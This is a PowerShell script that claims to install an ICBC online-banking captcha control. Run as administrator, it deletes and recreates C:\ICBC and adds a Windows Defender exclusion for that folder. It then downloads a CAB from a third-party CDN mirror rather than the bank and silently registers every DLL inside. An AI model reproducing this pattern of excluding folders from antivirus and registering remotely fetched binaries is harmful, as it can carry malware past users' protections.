# This script must be run as administrator
# Save as .ps1 file, right-click and select "Run with PowerShell"
chcp

# Strict mode to help catch potential errors
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# Configuration parameters
$cabUrl = "https://cdn.jsdmirror.com/gh/huibsoft/static/AxSafeControls.cab"
$targetDir = "C:\ICBC"
$cabFileName = "AxSafeControls.cab"
$cabPath = Join-Path $targetDir $cabFileName

# Function: output with timestamp
function Write-Log {
    param([string]$Message, [string]$Color = "White")
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $Message" -ForegroundColor $Color
}

# Function: wait for any key press to exit
function Wait-ForKeyPress {
    Write-Host "`nPress any key to exit..." -ForegroundColor Green
    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Check administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Error: Please run this script as administrator!" -ForegroundColor Red
    Wait-ForKeyPress
    exit 1
}

Write-Host ""
Write-Host "ICBC Online Banking Captcha Control" -ForegroundColor Cyan
Write-Host ""

# 1. Prepare target directory
if (Test-Path $targetDir) {
    Remove-Item $targetDir -Recurse -Force
}
New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

# 2. Add Defender exclusion (ignore error if already exists)
Add-MpPreference -ExclusionPath $targetDir -ErrorAction SilentlyContinue

try {
    # 3. Download CAB file
    Write-Log "Downloading control..." -Color Yellow
    try {
        Invoke-WebRequest -Uri $cabUrl -OutFile $cabPath -UseBasicParsing
    } catch {
        throw "Download failed: $_"
    }

    # 4. Extract CAB file
    Write-Log "Extracting files..." -Color Yellow
    $expandOutput = & expand $cabPath -F:* $targetDir 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "Extraction failed: $expandOutput"
    }

    # 5. Find all DLL files that need registration
    $controlFiles = Get-ChildItem -Path $targetDir -Include *.dll -Recurse
    if ($controlFiles.Count -eq 0) {
        throw "No registration files (.dll) found in extracted files."
    }

    Write-Log "Found $($controlFiles.Count) files to register:" -Color Cyan
    $controlFiles | ForEach-Object { Write-Host "    - $($_.Name)" }

    # 6. Determine regsvr32 path to use (prefer 32-bit version)
    $regsvr32 = if (Test-Path "$env:SystemRoot\SysWOW64\regsvr32.exe") {
        "$env:SystemRoot\SysWOW64\regsvr32.exe"
    } else {
        "$env:SystemRoot\System32\regsvr32.exe"
    }

    # 7. Register each control file (show result for each)
    Write-Log "Starting registration..." -Color Yellow

    foreach ($file in $controlFiles) {
        Write-Host "Registering: $($file.Name) ... " -NoNewline
        try {
            $regResult = Start-Process -FilePath $regsvr32 -ArgumentList "/s `"$($file.FullName)`"" -Wait -PassThru -NoNewWindow
            if ($regResult.ExitCode -eq 0) {
                Write-Host "Success" -ForegroundColor Green
            } else {
                Write-Host "Failed (exit code: $($regResult.ExitCode))" -ForegroundColor Red
            }
        } catch {
            Write-Host "Exception: $_" -ForegroundColor Red
        }
    }

} catch {
    Write-Log "Error during installation:" -Color Red
    Write-Host "    $_" -ForegroundColor Red
    Wait-ForKeyPress
    exit 1
} finally {
    # 8. Clean up CAB file (keep extracted files)
    if (Test-Path $cabPath) {
        Remove-Item $cabPath -Force -ErrorAction SilentlyContinue
    }
    Write-Log "Control installation completed => $targetDir" -Color Yellow
}

# Success, wait for key press to exit
Wait-ForKeyPress
exit 0